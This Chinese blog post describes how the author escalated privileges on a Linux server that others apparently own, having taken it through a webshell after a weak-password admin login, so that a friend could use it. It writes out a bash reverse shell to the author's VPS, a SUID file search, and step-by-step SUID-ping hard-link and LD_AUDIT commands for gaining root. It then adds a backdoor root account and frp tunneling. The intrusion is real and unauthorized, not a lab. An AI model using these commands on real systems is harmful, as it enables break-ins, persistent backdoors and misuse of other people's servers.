## **0X01** **前言**

**最近一个小老弟问我有没有闲置的服务器，windows倒是有几台，但是小老弟是Linux系统管理员不熟悉windows，翻翻我的webshell找到了一两台Linux不过权限都很低，想着怎么着也要把它给提下来吧（吃了人家一顿饭嘿嘿）于是就有了本文，也GET到了新的提权姿势。**

##  **0X02** **正文**

**shell怎么拿到的不详说，弱口令后台getshell。使用命令whoami查看当前权限。发现是nobody权限。nobody在linux中是一个不能登陆的帐号，一些服务进程如apache，aquid等都采用一些特殊的帐号来运行，比如nobody,news,games等等，这是就可以防止程序本身有安全问题的时候，不会被黑客获得root权限。**

![图片.png](https://image.3001.net/images/20181108/1541657576_5be3d3e8bad6d.png!small)

说道Linux提权最先想到的肯定是利用利用内核漏洞找到对应版本相应的exp直接进行溢出提权。

首先使用命令uname-a查看当前操作系统版本。发现是2.6.18-194.17.1.el5

![图片.png](https://image.3001.net/images/20181108/1541657591_5be3d3f7a54c4.png!small)比较老了，心里想着这还不分分钟给你提下来。linux提权首先的获取到一个交互式的shell。有好几种方法可以实现，这里我用的是bash法。首先在你vps上监听一个端口使用命令nc-lvp port即可，然后在webshell上执行bash-i >& /dev/tcp/ip/port0>&1获取到反弹回来的shell。

![图片.png](https://image.3001.net/images/20181108/1541657605_5be3d4052254e.png!small)![图片.png](https://image.3001.net/images/20181108/1541657609_5be3d409af370.png!small)

查找当前系统可使用的exp，上传，给权限，gcc编译，执行，一条龙操作。不过这个过程可能会遇到各种问题。受害主机可能没有装gcc，gcc编译提示缺少库，能执行却依旧提升不了权限。反正我是各种exp用尽然而还是提不下来。

转换思路，发现受害主机使用的是MySQL，于是一通乱翻终于找到了MySQL密码，想利用MySQLudf提权，不过之前Linux下udf提权一直没尝试过，而且网上关于这方面的文章很少还基本都长一个样，遂放弃。

![图片.png](https://image.3001.net/images/20181108/1541657624_5be3d41819016.png!small)MySQL密码其实挺简单的，我就想着数据库密码都这么简单，会不会ssh也是个弱口令了，尝试去连接，不能直连，遂放弃。

![图片.png](https://image.3001.net/images/20181108/1541657635_5be3d42380202.png!small)passwdshadow文件也没权限读。怎么办？？各种搜索，发现还有一招SUID提权法。网上关于这方面的文章也比较少。SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。首先要找到系统里使用SUID的文件，使用命令find/
-perm -u=s -type f 2>/dev/null

![图片.png](https://image.3001.net/images/20181108/1541657647_5be3d42f7d5ce.png!small)可以看到这么多文件都是都是带SUID标识符的。这里我们使用ping。  

操作步骤如下（来自博客 <https://blog.csdn.net/fffygapl/article/details/51783346>）

> 切换到tmp目录  
> cd/tmp
>
> 创建一个exploit目录  
> mkdirexploit
>
> 查看ping命令带suid权限  
> ll/bin/ping
>
> 创建target文件硬链接  
> ln/bin/ping /tmp/exploit/target
>
> 查看target文件权限  
> ll/tmp/exploit/target
>
> 把target文件加载到内存中  
> exec3< /tmp/exploit/target
>
> 查看target在内存中的情况  
> “ll/proc/$$/fd/3”
>
> 删除target文件  
> rm-rf /tmp/exploit/
>
> 查看target在内存中的情况是删除状态  
> “ll/proc/$$/fd/3”
>
> 创建一个c语言代码  
> vimpayload.c

实际这里由于是反弹的bash所以不建议直接在bash下使用vim，可以自己本地写好然后传到tmp目录下即可。还有如果ll命令不可用的话可以使用ls-l代替。

> 利用gcc编译这段代码  
> gcc-W -fPIC -shared -o /tmp/exploit payload.c
>
> 提升到root权限  
> LD_AUDIT="\$ORIGIN"exec /proc/self/fd/3

执行完，查看当前会话已经是root

![图片.png](https://image.3001.net/images/20181108/1541657672_5be3d44818ac1.png!small)

OK已经是root权限了

接下的的操作就不细讲了，新建一个用户修改passwd添加到root用户组然后使用frp进行内网穿透，这里也有一个坑，在bash下用vi编辑passwd文件非常不方便，可以本地改好然后在替换掉passwd。附上一张ssh成功连接图。

![图片.png](https://image.3001.net/images/20181108/1541657688_5be3d45831346.png!small)

##  **0X03** **写在后面的话**  

也算是学习了一波新姿势了，感觉udf提权还是可以去摸索一下的，搞安全的就是在不断地实战中慢慢成长。

